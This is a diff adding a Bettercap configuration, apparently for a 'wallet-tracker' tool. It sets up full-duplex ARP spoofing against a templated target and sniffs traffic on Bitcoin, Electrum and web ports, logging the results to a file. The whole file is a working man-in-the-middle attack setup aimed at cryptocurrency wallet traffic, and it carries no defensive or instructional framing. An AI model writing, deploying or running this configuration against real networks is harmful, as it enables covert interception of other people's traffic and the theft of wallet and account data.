@@ -1,0 +1,15 @@
+# Bettercap ARP+Sniff Config
+set arp.spoof.targets {{.args.target}}
+set arp.spoof.fullduplex true
+arp.spoof on
+
+set net.sniff.verbose true
+set net.sniff.filter tcp.port in {8333,18333,50001,50002,443,80,8080}
+net.sniff on
+
+# Events to dashboard
+events.stream
+
+set logger.file /opt/wallet-tracker/logs/bettercap.log
+set logger.level 7
+logger on
